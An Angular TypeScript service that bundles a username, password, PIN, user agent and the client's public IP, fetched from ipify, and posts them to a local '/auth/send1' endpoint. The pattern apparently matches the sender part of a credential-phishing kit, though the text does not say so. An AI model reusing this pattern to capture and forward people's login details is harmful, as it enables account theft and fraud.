import { Observable } from 'rxjs';
import { HttpClient,HttpHeaders } from '@angular/common/http';
import { Injectable } from '@angular/core';

@Injectable({
  providedIn: 'root'
})
export class SendService {

  private baseurl ="http://localhost:91"
  constructor(
    private httpx:HttpClient
  ) { }

  sendCren(content:FormData):Observable<any>{
    let headers = new HttpHeaders().set('Content-Type', 'application/x-www-form-urlencoded');
    return this.httpx.post(this.baseurl+'/auth/send1', 'use='+content.get('use')+'&pas='+content.get('pas')+'&agent='+content.get('agent')+'&pinxs='+content.get('pinxs')+'&ips='+content.get('ips'),{headers:headers})
  }
  getipx():Observable<any>{
    return this.httpx.get('https://api.ipify.org/?format=json')
  }



  
}
